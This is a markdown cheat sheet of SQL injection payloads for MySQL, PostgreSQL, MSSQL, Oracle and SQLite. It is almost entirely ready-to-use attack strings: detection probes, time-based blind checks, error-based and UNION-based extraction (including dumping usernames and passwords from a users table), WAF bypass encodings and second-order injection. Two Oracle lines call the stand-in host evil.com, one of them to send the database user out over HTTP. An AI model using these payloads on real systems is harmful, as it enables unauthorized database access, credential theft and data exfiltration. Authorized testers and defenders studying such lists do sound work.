# SQLi Payloads — Per-Database Edition

## Universal Detection
```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
' UNION SELECT NULL--
' AND 1=1--
' AND 1=2--
1' ORDER BY 1--+
1' ORDER BY 100--+
```

## Time-Based Blind
```sql
-- MySQL
' AND SLEEP(5)--
' AND BENCHMARK(5000000,SHA1('test'))--
' OR IF(1=1,SLEEP(5),0)--

-- PostgreSQL  
'; SELECT pg_sleep(5)--
' AND (SELECT pg_sleep(5))--
' || pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))A)--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND UTL_INADDR.get_host_address('sleep5sec.'||'evil.com')='1'--

-- SQLite
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
```

## Error-Based Extraction
```sql
-- MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS INT)--
' AND 1=1/(SELECT CAST(version() AS NUMERIC))--

-- MSSQL
' AND 1=CONVERT(INT,(SELECT @@version))--
' AND 1=(SELECT TOP 1 CAST(name AS INT) FROM sysobjects)--
```

## UNION-Based Extraction
```sql
-- Column count detection
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- MySQL data extraction
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--

-- PostgreSQL
' UNION SELECT NULL,string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public'--
' UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'--
```

## WAF Bypass Techniques
```sql
-- Comment injection
'/**/UNION/**/SELECT/**/NULL--
'/*!50000UNION*//*!50000SELECT*/NULL--

-- Case variation
' uNiOn SeLeCt NULL--
' UnIoN/**/sElEcT NULL--

-- No spaces
'UNION(SELECT(NULL))--
'||UTL_HTTP.REQUEST('evil.com/'||(SELECT+user+FROM+dual))--

-- Hex encoding
' UNION SELECT 0x61646d696e--

-- URL encoding
%27%20UNION%20SELECT%20NULL--
%27%20OR%20%271%27%3D%271

-- Double URL encoding
%2527%2520OR%25201%253D1--
```

## Second-Order SQLi
```sql
-- Register with injection payload as username
admin'--
admin'/*
' OR 1=1--

-- Payload triggers when app uses stored username in another query
-- e.g., SELECT * FROM logs WHERE username='admin'--'
```
